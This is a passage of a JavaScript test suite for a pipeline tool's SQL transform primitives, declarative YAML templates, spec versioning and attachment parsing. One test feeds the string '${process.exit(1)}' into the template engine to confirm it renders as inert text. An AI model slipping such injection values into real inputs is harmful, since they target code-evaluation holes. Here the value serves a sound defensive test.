  await test('buildDiscoveryProgress() marks a skill "not-started" when none of its fields have been touched, and "addressed" is never reached via coverage:"complete" mid-interview', () => {
    const mock = createMock();
    const { buildDiscoveryProgress } = withMock(mock, () => require('../dist/core/discoveryProgress.js'));
    const skills = [{ id: 'constraints', name: 'Constraints & Assumptions', order: 1, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['constraints', 'assumptions'] }];
    const session = {
      id: 's', problemStatement: 'p', state: 'discovery', questions: [], answers: [], insights: [],
      coverage: { constraints: 'missing', assumptions: 'missing' },
      turnCount: 0, turnBudget: 12, createdAt: '', updatedAt: ''
    };
    const progress = buildDiscoveryProgress(session, skills);
    assert.strictEqual(progress.coveredFields, 0);
    assert.strictEqual(progress.skills[0].status, 'not-started');
  });

  await test('skillNameForField() resolves the owning skill deterministically, ignoring any skill the LLM itself might claim', () => {
    const mock = createMock();
    const { skillNameForField } = withMock(mock, () => require('../dist/core/discoveryProgress.js'));
    const skills = [
      { id: 'source-catalog', name: 'Source Catalog', order: 1, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['sourceCatalog'] },
      { id: 'data-flow', name: 'Data Flow', order: 2, description: '', systemPrompt: 'p', questionGuidance: '', specFields: ['dataFlows', 'dependencies'] }
    ];
    assert.strictEqual(skillNameForField('dependencies', skills), 'Data Flow');
    assert.strictEqual(skillNameForField('sourceCatalog', skills), 'Source Catalog');
    assert.strictEqual(skillNameForField('unownedField', skills), undefined);
  });

  // ── Phase 2: deterministic transform primitives ──

  await test('renameCastPrimitive.compile() produces exact, deterministic SQL for a view target', () => {
    const { TRANSFORM_PRIMITIVES } = require('../dist/engine/transforms/registry.js');
    const spec = {
      sourceObject: 'RAW_DB.PUBLIC.raw_customers',
      targetObject: 'CURATED_DB.STAGING.stg_customers',
      objectKind: 'view',
      columns: [
        { source: 'cust_id', target: 'customer_id', type: 'STRING' },
        { source: 'cust_name', target: 'customer_name' }
      ]
    };
    const compiled = TRANSFORM_PRIMITIVES.rename_cast.compile(spec, { platform: 'snowflake', database: 'CURATED_DB', schema: 'STAGING' }, 'snowflake');
    assert.strictEqual(compiled.content, 'CREATE OR REPLACE VIEW CURATED_DB.STAGING.stg_customers AS\nSELECT\n  cust_id::STRING AS customer_id,\n  cust_name AS customer_name\nFROM RAW_DB.PUBLIC.raw_customers;\n');
    const secondRun = TRANSFORM_PRIMITIVES.rename_cast.compile(spec, { platform: 'snowflake', database: 'CURATED_DB', schema: 'STAGING' }, 'snowflake');
    assert.strictEqual(secondRun.content, compiled.content, 'compiling the same spec twice is byte-identical (pure function, no LLM involved)');
  });

  await test('renameCastPrimitive.compile() produces a dbt staging model when objectKind is "dbt_model"', () => {
    const { TRANSFORM_PRIMITIVES } = require('../dist/engine/transforms/registry.js');
    const compiled = TRANSFORM_PRIMITIVES.rename_cast.compile({
      sourceObject: 'staging.raw_orders',
      targetObject: 'stg_orders',
      objectKind: 'dbt_model',
      columns: [{ source: 'order_id', target: 'order_id' }]
    }, { platform: 'databricks', database: 'db', schema: 'staging' }, 'spark_sql');
    assert.ok(compiled.content.includes("{{ source('staging', 'raw_orders') }}"), 'builds a dbt source() reference from the schema.table source object');
    assert.ok(!compiled.content.includes('CREATE OR REPLACE'), 'a dbt model body has no DDL wrapper — dbt owns materialization');
  });

  await test('dedupPrimitive.compile() uses EXCLUDE on Snowflake and EXCEPT on every other dialect', () => {
    const { TRANSFORM_PRIMITIVES } = require('../dist/engine/transforms/registry.js');
    const spec = {
      sourceObject: 'src.customers',
      targetObject: 'tgt.customers_dedup',
      partitionByColumns: ['customer_id'],
      orderByColumn: 'updated_at'
    };
    const snowflakeSql = TRANSFORM_PRIMITIVES.dedup.compile(spec, { platform: 'snowflake', database: 'd', schema: 's' }, 'snowflake');
    const sparkSql = TRANSFORM_PRIMITIVES.dedup.compile(spec, { platform: 'databricks', database: 'd', schema: 's' }, 'spark_sql');
    assert.ok(snowflakeSql.content.includes('EXCLUDE (__dedup_rn)'));
    assert.ok(sparkSql.content.includes('EXCEPT (__dedup_rn)'));
    assert.ok(snowflakeSql.content.includes('ORDER BY updated_at DESC'), 'defaults to DESC (latest wins) when orderDirection is omitted');
  });

  await test('incrementalLoadPrimitive.compile() produces a deterministic MERGE keyed on keyColumns', () => {
    const { TRANSFORM_PRIMITIVES } = require('../dist/engine/transforms/registry.js');
    const compiled = TRANSFORM_PRIMITIVES.incremental_load.compile({
      sourceObject: 'src.orders_cdc',
      targetObject: 'tgt.orders',
      keyColumns: ['order_id'],
      updateColumns: ['status', 'total']
    }, { platform: 'snowflake', database: 'd', schema: 's' }, 'snowflake');
    assert.ok(compiled.content.includes('MERGE INTO tgt.orders AS tgt'));
    assert.ok(compiled.content.includes('ON tgt.order_id = src.order_id'));
    assert.ok(compiled.content.includes('tgt.status = src.status'));
    assert.ok(compiled.content.includes('INSERT (order_id, status, total)'));
  });

  await test('validateTransformSpec() rejects params missing a required field, and an unknown primitive kind', () => {
    const { validateTransformSpec } = require('../dist/engine/transforms/registry.js');
    const missingField = validateTransformSpec({ kind: 'dedup', params: { sourceObject: 's', targetObject: 't', partitionByColumns: ['id'] } });
    assert.strictEqual(missingField.valid, false, 'orderByColumn is required and was omitted');
    const unknownKind = validateTransformSpec({ kind: 'not_a_real_primitive', params: {} });
    assert.strictEqual(unknownKind.valid, false);
    assert.ok(unknownKind.errors[0].includes('Unknown primitive kind'));
  });

  function baseAgentContext(callLlm) {
    return { objective: 'obj', schemaContext: 'ctx', sourceProvider: 'snowflake', settings: {}, configManager: { getSecret: async () => undefined, getSettings: () => ({}) }, log: () => {}, callLlm };
  }


  // ── Phase 2B-ii: primitive extensibility (Tier 2, declarative) ──

  function validPrimitiveDefinitionYaml(kind, version = 1) {
    return [
      `kind: ${kind}`,
      `version: ${version}`,
      'status: published',
      `description: "Adds a running total column via a window function."`,
      'paramSchema:',
      '  type: object',
      '  additionalProperties: false',
      '  required: [sourceObject, targetObject, partitionByColumns, orderByColumn, valueColumn]',
      '  properties:',
      '    sourceObject: { type: string, minLength: 1 }',
      '    targetObject: { type: string, minLength: 1 }',
      '    partitionByColumns: { type: array, items: { type: string } }',
      '    orderByColumn: { type: string }',
      '    valueColumn: { type: string }',
      'platformTemplates:',
      '  default: |',
      '    CREATE OR REPLACE VIEW {{targetObject}} AS',
      '    SELECT *, SUM({{valueColumn}}) OVER (PARTITION BY {{join partitionByColumns ", "}} ORDER BY {{orderByColumn}}) AS running_total',
      '    FROM {{sourceObject}};',
      'previewParams:',
      '  sourceObject: src.sales',
      '  targetObject: tgt.sales_running_total',
      '  partitionByColumns: [region]',
      '  orderByColumn: sale_date',
      '  valueColumn: amount',
      'outputChecks:',
      '  - mustContain: "{{targetObject}}"'
    ].join('\n');
  }

  await test('renderTemplate() supports {{param}}, {{join}}, and {{#each}}, with no code-execution path', () => {
    const { renderTemplate } = require('../dist/engine/transforms/declarative/templateEngine.js');

    const simple = renderTemplate('SELECT {{col}} FROM {{tbl}}', { col: 'id', tbl: 'orders' });
    assert.strictEqual(simple, 'SELECT id FROM orders');

    const joined = renderTemplate('PARTITION BY {{join cols ", "}}', { cols: ['a', 'b', 'c'] });
    assert.strictEqual(joined, 'PARTITION BY a, b, c');

    const each = renderTemplate('{{#each cols}}[{{this}}]{{/each}}', { cols: ['x', 'y'] });
    assert.strictEqual(each, '[x][y]');

    // A JS-injection-shaped param value must render as inert literal text, never be evaluated.
    const injectionAttempt = renderTemplate('col={{col}}', { col: '${process.exit(1)}' });
    assert.strictEqual(injectionAttempt, 'col=${process.exit(1)}', 'the engine has no eval/Function() path — this is always just text');

    const unknownVar = renderTemplate('X={{missing}}', {});
    assert.strictEqual(unknownVar, 'X=', 'an unknown variable renders as empty text, never throws');
  });

  await test('validatePrimitiveDefinition() rejects a malformed definition with a specific error', () => {
    const { validatePrimitiveDefinition } = require('../dist/engine/transforms/declarative/schema.js');
    const missingParamSchema = { kind: 'foo', version: 1, status: 'draft', description: 'x', platformTemplates: { default: 'x' }, previewParams: {} };
    const result = validatePrimitiveDefinition(missingParamSchema);
    assert.strictEqual(result.valid, false);
    assert.ok(result.errors.some((e) => e.includes('paramSchema')));

    const missingDefaultTemplate = { kind: 'foo', version: 1, status: 'draft', description: 'x', paramSchema: {}, platformTemplates: { snowflake: 'x' }, previewParams: {} };
    assert.strictEqual(validatePrimitiveDefinition(missingDefaultTemplate).valid, false, 'platformTemplates must include a "default" entry');
  });

  await test('createDeclarativePrimitive() compiles a Tier-2 definition through the exact same TransformPrimitive interface Tier 1 uses', () => {
    const { createDeclarativePrimitive } = require('../dist/engine/transforms/declarative/adapter.js');
    const yaml = require('yaml');
    const definition = yaml.parse(validPrimitiveDefinitionYaml('window_running_total'));
    const primitive = createDeclarativePrimitive(definition);

    assert.strictEqual(primitive.kind, 'window_running_total');
    const compiled = primitive.compile(definition.previewParams, { platform: 'snowflake', database: 'd', schema: 's' }, 'snowflake');
    assert.ok(compiled.content.includes('CREATE OR REPLACE VIEW tgt.sales_running_total'));
    assert.ok(compiled.content.includes('PARTITION BY region ORDER BY sale_date'));
  });

  await test('createDeclarativePrimitive() throws when an outputCheck fails, rather than silently shipping bad output', () => {
    const { createDeclarativePrimitive } = require('../dist/engine/transforms/declarative/adapter.js');
    const primitive = createDeclarativePrimitive({
      kind: 'broken', version: 1, status: 'published', description: 'x',
      paramSchema: {}, platformTemplates: { default: 'SELECT 1;' }, previewParams: {},
      outputChecks: [{ mustContain: '{{targetObject}}' }]
    });
    assert.throws(() => primitive.compile({ targetObject: 'tgt.x' }, { platform: 'snowflake', database: 'd', schema: 's' }, 'snowflake'), /outputCheck/);
  });

  await test('loadPrimitiveDefinitionsFromDirectory() loads valid definitions and reports (not silently drops) malformed ones', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const { loadPrimitiveDefinitionsFromDirectory } = require('../dist/engine/transforms/declarative/loader.js');

    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-primitives-'));
    fs.writeFileSync(path.join(dir, 'window_running_total.yaml'), validPrimitiveDefinitionYaml('window_running_total'));
    fs.writeFileSync(path.join(dir, 'broken.yaml'), 'kind: broken\nversion: 1\n'); // missing required fields
    fs.writeFileSync(path.join(dir, 'notes.txt'), 'not a primitive file, must be ignored');

    const result = loadPrimitiveDefinitionsFromDirectory(dir);
    assert.strictEqual(result.definitions.length, 1);
    assert.strictEqual(result.definitions[0].kind, 'window_running_total');
    assert.strictEqual(result.errors.length, 1, 'the malformed file is reported as an error, not silently skipped');
    assert.strictEqual(result.errors[0].file, 'broken.yaml');

    fs.rmSync(dir, { recursive: true, force: true });
  });

  await test('mergePrimitiveDefinitions() lets a later-loaded override win over a bundled default of the same kind', () => {
    const { mergePrimitiveDefinitions } = require('../dist/engine/transforms/declarative/loader.js');
    const yaml = require('yaml');
    const bundledDedup = yaml.parse(validPrimitiveDefinitionYaml('dedup', 1));
    const overrideDedup = yaml.parse(validPrimitiveDefinitionYaml('dedup', 2));
    overrideDedup.description = 'workspace override';

    const merged = mergePrimitiveDefinitions([bundledDedup], [overrideDedup]);
    assert.strictEqual(merged.length, 1);
    assert.strictEqual(merged[0].version, 2);
    assert.strictEqual(merged[0].description, 'workspace override', 'the workspace override, loaded later, wins — matching the skills system\'s override semantics');
  });

  await test('registerPrimitives()/resetDeclarativePrimitives(): a new kind requires zero TypeScript changes, Tier 1 always wins a name collision, and reset only removes Tier 2', async () => {
    const registry = require('../dist/engine/transforms/registry.js');
    const { createDeclarativePrimitive } = require('../dist/engine/transforms/declarative/adapter.js');
    const yaml = require('yaml');

    // Purely declarative — this "primitive" never appears in any .ts file.
    const definition = yaml.parse(validPrimitiveDefinitionYaml('window_running_total'));
    const declarative = createDeclarativePrimitive(definition);

    const { added, skipped } = registry.registerPrimitives([declarative]);
    assert.deepStrictEqual(added, ['window_running_total']);
    assert.deepStrictEqual(skipped, []);
    assert.strictEqual(registry.TRANSFORM_PRIMITIVES.window_running_total, declarative, 'appears in TRANSFORM_PRIMITIVES exactly like a Tier-1 entry, same object key');

    // selectTransformSpec()/compileTransformSpec() work identically for a Tier-2 kind — no call site needs to know the tier.
    const compiled = registry.compileTransformSpec(
      { kind: 'window_running_total', params: definition.previewParams },
      { platform: 'snowflake', database: 'd', schema: 's' }, 'snowflake'
    );
    assert.ok(compiled.content.includes('running_total'));

    // A Tier-2 attempt to shadow a Tier-1 kind is skipped, and the original Tier-1 primitive keeps serving that kind.
    const fakeDedup = createDeclarativePrimitive(yaml.parse(validPrimitiveDefinitionYaml('dedup')));
    const collision = registry.registerPrimitives([fakeDedup]);
    assert.deepStrictEqual(collision.added, []);
    assert.deepStrictEqual(collision.skipped, ['dedup']);
    assert.notStrictEqual(registry.TRANSFORM_PRIMITIVES.dedup, fakeDedup, 'Tier 1 (reviewed code) always wins a kind collision');

    registry.resetDeclarativePrimitives();
    assert.strictEqual(registry.TRANSFORM_PRIMITIVES.window_running_total, undefined, 'Tier 2 primitive removed by reset');
    assert.ok(registry.TRANSFORM_PRIMITIVES.dedup, 'Tier 1 primitives are untouched by reset');
  });

  // ── Phase 2B-i: declarative specification framework (Pipeline Spec + attachment extraction) ──

  function samplePipelineSpec(overrides = {}) {
    return {
      specVersion: 1,
      id: 'pipeline-test',
      version: 1,
      status: 'draft',
      derivedFromBpsId: 'bps-1',
      derivedFromBpsVersion: 1,
      targetPlatform: 'snowflake',
      entities: [
        {
          name: 'customers',
          source: { object: 'RAW_DB.PUBLIC.raw_customers', type: 'table' },
          transforms: [{ kind: 'rename_cast', params: { sourceObject: 'RAW_DB.PUBLIC.raw_customers', targetObject: 'CURATED_DB.STAGING.stg_customers', columns: [{ source: 'cust_id', target: 'customer_id' }] } }],
          target: { object: 'CURATED_DB.STAGING.stg_customers', materialization: 'view' }
        },
        {
          name: 'orders',
          source: { object: 'RAW_DB.PUBLIC.raw_orders', type: 'table' },
          transforms: [{ kind: 'incremental_load', params: { sourceObject: 'RAW_DB.PUBLIC.raw_orders', targetObject: 'CURATED_DB.STAGING.orders', keyColumns: ['order_id'], updateColumns: ['status'] } }],
          target: { object: 'CURATED_DB.STAGING.orders', materialization: 'table' }
        },
        {
          name: 'products',
          source: { object: 'RAW_DB.PUBLIC.raw_products', type: 'table' },
          transforms: [],
          target: { object: 'CURATED_DB.STAGING.products', materialization: 'table' }
        }
      ],
      createdAt: 'c', updatedAt: 'u',
      ...overrides
    };
  }

  await test('PIPELINE_SPEC_SCHEMA rejects an unrecognized key at the top level, entity level, and source/target level', () => {
    const { validatePipelineSpec } = require('../dist/engine/pipelineSpec/validator.js');
    const valid = validatePipelineSpec(samplePipelineSpec());
    assert.strictEqual(valid.valid, true, 'a well-formed spec passes');

    const topLevelTypo = validatePipelineSpec({ ...samplePipelineSpec(), unexpectedField: 'x' });
    assert.strictEqual(topLevelTypo.valid, false);

    const entityWithTypo = samplePipelineSpec();
    entityWithTypo.entities[0].unexpectedField = 'x';
    assert.strictEqual(validatePipelineSpec(entityWithTypo).valid, false, 'entity-level typo rejected');

    const sourceWithTypo = samplePipelineSpec();
    sourceWithTypo.entities[0].source.sourceObjct = 'x'; // the exact typo used as the running example
    assert.strictEqual(validatePipelineSpec(sourceWithTypo).valid, false, 'nested source-block typo rejected');
  });

  await test('compilePipelineSpec() deterministically compiles every entity with zero LLM calls', () => {
    const { compilePipelineSpec } = require('../dist/engine/pipelineSpec/compiler.js');
    const spec = samplePipelineSpec();
    const compiled = compilePipelineSpec(spec, 'snowflake');
    assert.strictEqual(compiled.length, 3);
    assert.strictEqual(compiled[0].name, 'customers');
    assert.strictEqual(compiled[0].artifacts.length, 1);
    assert.ok(compiled[0].artifacts[0].content.includes('CURATED_DB.STAGING.stg_customers'));
    assert.strictEqual(compiled[2].artifacts.length, 0, 'an entity with no transforms compiles to zero artifacts, not an error');
  });

  await test('generateDesignDoc() is a pure, deterministic function of the spec — byte-identical across repeated calls', () => {
    const { generateDesignDoc } = require('../dist/engine/pipelineSpec/designDocGenerator.js');
    const spec = samplePipelineSpec();
    const first = generateDesignDoc(spec);
    const second = generateDesignDoc(spec);
    assert.strictEqual(first, second);
    assert.ok(first.includes('customers'));
    assert.ok(first.includes('```mermaid'), 'embeds a lineage diagram');
  });

  await test('PipelineSpecManager version-bumps only when revising an approved predecessor, and archives the prior revision', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
          stat: async (uri) => { if (!store.has(keyOf(uri))) throw new Error('ENOENT'); return {}; }
        } }
      };
    }
    const mock = fsMapMock();
    try { delete require.cache[require.resolve('../dist/context/PipelineSpecManager.js')]; } catch { /* not loaded */ }
    const { PipelineSpecManager } = withMock(mock, () => require('../dist/context/PipelineSpecManager.js'));
    const mgr = new PipelineSpecManager({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => mgr.initialize());
    assert.strictEqual(mgr.getSpec(), undefined);

    const draftV1 = samplePipelineSpec();
    await withMock(mock, () => mgr.saveSpec(draftV1));
    const approvedV1 = await withMock(mock, () => mgr.approve());
    assert.strictEqual(approvedV1.version, 1, 'approving a draft does not bump the version');
    assert.strictEqual(approvedV1.status, 'approved');

    const revisionV2 = samplePipelineSpec({ version: 2, status: 'draft' });
    await withMock(mock, () => mgr.saveSpec(revisionV2));
    assert.strictEqual(mgr.getSpec().version, 2);

    let historyRaw = null;
    await withMock(mock, () => mock.workspace.fs.readFile({ fsPath: '/ws/spec/history/pipeline.v1.approved.yaml' })).then((b) => { historyRaw = b.toString('utf8'); });
    assert.ok(historyRaw.includes('version: 1'), 'the approved v1 revision was archived before being replaced');
  });

  await test('PipelineSpecManager loads a specVersion-mismatched document leniently, with a warning, instead of hard-failing', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
          stat: async () => { throw new Error('ENOENT'); }
        } },
        __store: store
      };
    }
    const mock = fsMapMock();
    const yaml = require('yaml');
    // A document from a future/older specVersion, missing fields the current schema would require.
    mock.__store.set('/ws/spec/pipeline.yaml', yaml.stringify({ specVersion: 99, id: 'old', version: 1, status: 'draft' }));
    try { delete require.cache[require.resolve('../dist/context/PipelineSpecManager.js')]; } catch { /* not loaded */ }
    const { PipelineSpecManager } = withMock(mock, () => require('../dist/context/PipelineSpecManager.js'));
    const logs = [];
    const mgr = new PipelineSpecManager({ fsPath: '/ws' }, (msg) => logs.push(msg));
    await withMock(mock, () => mgr.initialize());
    assert.ok(mgr.getSpec(), 'loads instead of throwing');
    assert.strictEqual(mgr.getSpec().id, 'old');
    assert.ok(logs.some((l) => l.includes('specVersion 99') && l.includes('loading leniently')));
  });

  await test('fallbackAttachmentExtract()/parseAttachmentExtract() degrade gracefully instead of throwing on a malformed extraction response', () => {
    const { fallbackAttachmentExtract, parseAttachmentExtract } = require('../dist/core/attachmentExtraction.js');
    const attachment = { id: 'att-1', path: 'schema.sql', content: 'CREATE TABLE orders (order_id INT, status STRING);', attachedAt: 'c' };

    const fallback = fallbackAttachmentExtract(attachment);
    assert.strictEqual(fallback.confidence, 'low');
    assert.ok(fallback.rawSummary.length > 0);

    const fromGarbage = parseAttachmentExtract('not an object', attachment);
    assert.strictEqual(fromGarbage.confidence, 'low');
    assert.strictEqual(fromGarbage.attachmentId, 'att-1');

    const fromMalformedConfidence = parseAttachmentExtract({ rawSummary: 'a summary', confidence: 'extremely-high' }, attachment);
    assert.strictEqual(fromMalformedConfidence.confidence, 'low', 'an invalid confidence value falls back to low rather than propagating garbage');
  });

  await test('parseAttachmentExtract() extracts entities/columns from a well-formed response', () => {
    const { parseAttachmentExtract } = require('../dist/core/attachmentExtraction.js');
    const attachment = { id: 'att-1', path: 'schema.sql', content: 'CREATE TABLE orders (order_id INT, status STRING);', attachedAt: 'c' };
    const extract = parseAttachmentExtract({
      entities: [{ name: 'orders', columns: [{ name: 'order_id', type: 'INT' }, { name: 'status', type: 'STRING' }] }],
      rawSummary: 'An orders table.',
      confidence: 'high'
    }, attachment);
    assert.strictEqual(extract.entities[0].name, 'orders');
    assert.strictEqual(extract.entities[0].columns.length, 2);
  });

  await test('buildProvenance() (via parseComprehensiveSpec) tags sourceCatalog/dataFlows as source:"attachment" when an entity-extracting attachment informed them and no direct question did', () => {
    const { parseComprehensiveSpec } = require('../dist/core/specSynthesis.js');
    const session = {
      id: 's1', problemStatement: 'p', state: 'synthesizing', questions: [], answers: [], insights: [], coverage: {},
      turnCount: 1, turnBudget: 12, createdAt: 'c', updatedAt: 'u',
      attachments: [{ id: 'att-1', path: 'schema.sql', content: 'x', attachedAt: 'c', extract: { attachmentId: 'att-1', extractedAt: 'c', entities: [{ name: 'orders' }], rawSummary: 'x', confidence: 'high' } }]
    };
    const raw = { problemStatement: 'p', objectives: ['o'], scope: { in: ['x'] }, sourceCatalog: [{ name: 'orders', type: 'database' }] };
    const spec = parseComprehensiveSpec(raw, { session });
    const sourceCatalogProvenance = spec.provenance.find((p) => p.field === 'sourceCatalog');
    assert.strictEqual(sourceCatalogProvenance.source, 'attachment');
    assert.strictEqual(sourceCatalogProvenance.attachmentId, 'att-1');
  });

  await test('v0.45.12: attachments live in the interview, extracts kept and text left in its file, read back from the file on resume (the pack is how their content reaches later stages)', () => {
    const nodeFs = require('node:fs'); const os = require('node:os');
    const S = require('../dist/engine/interview/state.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-att-'));
    try {
      const root = nodePath.join(ws, '.autode', 'problems', 'p1');
      nodeFs.writeFileSync(nodePath.join(ws, 'brd.md'), '# Orders BRD\nOrders ship within 2 days.');
      const s = S.startInterview(root, 'Daily revenue from orders', [{ id: 'x', name: 'X', order: 1, description: '', systemPrompt: '', questionGuidance: '', specFields: ['scope'] }]);
      s.attachments = [{ id: 'att-1', path: 'brd.md', content: '# Orders BRD\nOrders ship within 2 days.', attachedAt: 'c', packDocument: 'brd', extract: { attachmentId: 'att-1', extractedAt: 'c', rawSummary: 'shipping rule', confidence: 'medium' } }];
      S.writeInterview(root, s);
      assert.ok(!nodeFs.readFileSync(S.interviewFile(root), 'utf8').includes('ship within'), 'the text stays in its file');
      assert.strictEqual(S.readInterview(root, ws).attachments[0].content, '# Orders BRD\nOrders ship within 2 days.', 'read back from the file');
      assert.strictEqual(S.readInterview(root, ws).attachments[0].extract.rawSummary, 'shipping rule', 'the extract is kept with the interview');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── Phase 2B-iii: primitive lifecycle management & UI-facing catalog ──

  await test('isSelectable(): Tier 1 (no status) and a "published" Tier 2 primitive are selectable; draft/deprecated/retired are not', () => {
    const { isSelectable, TRANSFORM_PRIMITIVES } = require('../dist/engine/transforms/registry.js');
    assert.strictEqual(isSelectable(TRANSFORM_PRIMITIVES.dedup), true, 'Tier 1 has no status field and is always selectable');
    assert.strictEqual(isSelectable({ kind: 'x', status: 'published' }), true);
    assert.strictEqual(isSelectable({ kind: 'x', status: 'draft' }), false);
    assert.strictEqual(isSelectable({ kind: 'x', status: 'deprecated' }), false);
    assert.strictEqual(isSelectable({ kind: 'x', status: 'retired' }), false);
  });

  await test('publishPrimitiveDefinition() keeps the version on a first publish, then bumps + archives on a republish', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const { publishPrimitiveDefinition } = require('../dist/engine/transforms/declarative/lifecycle.js');

    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-primlife-'));
    const draftYaml = validPrimitiveDefinitionYaml('window_running_total').replace('status: published', 'status: draft');
    fs.writeFileSync(path.join(dir, 'window_running_total.yaml'), draftYaml);

    const first = publishPrimitiveDefinition(dir, 'window_running_total', 'user');
    assert.strictEqual(first.versionBumped, false, 'a first publish does not bump the version');
    assert.strictEqual(first.definition.version, 1);
    assert.strictEqual(first.definition.status, 'published');
    assert.ok(first.definition.publishedAt);

    const second = publishPrimitiveDefinition(dir, 'window_running_total', 'user');
    assert.strictEqual(second.versionBumped, true, 'republishing an already-published definition bumps the version');
    assert.strictEqual(second.definition.version, 2);

    const archived = fs.readFileSync(path.join(dir, 'history', 'window_running_total.v1.yaml'), 'utf8');
    assert.ok(archived.includes('version: 1'), 'the prior (v1) revision was archived before being replaced');

    fs.rmSync(dir, { recursive: true, force: true });
  });

  await test('deprecatePrimitiveDefinition() flips status without touching version, and the change is reflected by the registry after reload', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const { deprecatePrimitiveDefinition } = require('../dist/engine/transforms/declarative/lifecycle.js');
    const { loadPrimitiveDefinitionsFromDirectory } = require('../dist/engine/transforms/declarative/loader.js');

    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-primlife-'));
    fs.writeFileSync(path.join(dir, 'window_running_total.yaml'), validPrimitiveDefinitionYaml('window_running_total'));

    const deprecated = deprecatePrimitiveDefinition(dir, 'window_running_total');
    assert.strictEqual(deprecated.status, 'deprecated');
    assert.strictEqual(deprecated.version, 1, 'deprecation does not bump the version');

    const reloaded = loadPrimitiveDefinitionsFromDirectory(dir);
    assert.strictEqual(reloaded.definitions[0].status, 'deprecated', 'the on-disk change is picked up on the next directory load');

    fs.rmSync(dir, { recursive: true, force: true });
  });

  // ── Phase 2B-iv: governance, validation & versioning ──

  await test('compileTransformSpec() with primitiveVersion pins compilation to that archived revision, even after a newer version is live', () => {
    const registry = require('../dist/engine/transforms/registry.js');
    const { createDeclarativePrimitive } = require('../dist/engine/transforms/declarative/adapter.js');
    const yaml = require('yaml');

    const v1Def = yaml.parse(validPrimitiveDefinitionYaml('window_running_total_pin', 1));
    v1Def.platformTemplates.default = 'V1 TEMPLATE FOR {{targetObject}}';
    registry.registerPrimitiveVersion(createDeclarativePrimitive(v1Def)); // simulates a v1 archived under history/

    const v2Def = yaml.parse(validPrimitiveDefinitionYaml('window_running_total_pin', 2));
    v2Def.platformTemplates.default = 'V2 TEMPLATE FOR {{targetObject}}';
    registry.registerPrimitives([createDeclarativePrimitive(v2Def)]); // the live/published version

    const target = { platform: 'snowflake', database: 'd', schema: 's' };
    const pinnedToV1 = registry.compileTransformSpec({ kind: 'window_running_total_pin', params: v1Def.previewParams, primitiveVersion: 1 }, target, 'snowflake');
    assert.ok(pinnedToV1.content.includes('V1 TEMPLATE'), 'an approved spec pinned to v1 keeps compiling against v1 after v2 is published');

    const unpinned = registry.compileTransformSpec({ kind: 'window_running_total_pin', params: v2Def.previewParams }, target, 'snowflake');
    assert.ok(unpinned.content.includes('V2 TEMPLATE'), 'no pin means "whatever is currently live" — unchanged Phase 2 behavior');

    registry.resetDeclarativePrimitives();
    registry.resetVersionedPrimitives();
  });

  await test('publishPrimitiveDefinition() always populates publishedBy/publishedAt, never leaving them blank', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const { publishPrimitiveDefinition } = require('../dist/engine/transforms/declarative/lifecycle.js');

    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-primlife-'));
    const draftYaml = validPrimitiveDefinitionYaml('window_running_total').replace('status: published', 'status: draft');
    fs.writeFileSync(path.join(dir, 'window_running_total.yaml'), draftYaml);

    const result = publishPrimitiveDefinition(dir, 'window_running_total', 'platform-admin@example.com');
    assert.strictEqual(result.definition.publishedBy, 'platform-admin@example.com');
    assert.ok(result.definition.publishedAt && result.definition.publishedAt.length > 0);

    fs.rmSync(dir, { recursive: true, force: true });
  });

  await test('PipelineSpecManager loads a document with specVersion entirely absent (pre-dating its introduction) leniently, with a warning', async () => {
    function fsMapMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: { fs: {
          createDirectory: async () => {},
          readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v === undefined) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
          writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
          rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
          stat: async () => { throw new Error('ENOENT'); }
        } },
        __store: store
      };
    }
    const mock = fsMapMock();
    const yaml = require('yaml');
    // No specVersion key at all — a document from before this field existed.
    mock.__store.set('/ws/spec/pipeline.yaml', yaml.stringify({ id: 'pre-existing', version: 1, status: 'draft' }));
    try { delete require.cache[require.resolve('../dist/context/PipelineSpecManager.js')]; } catch { /* not loaded */ }
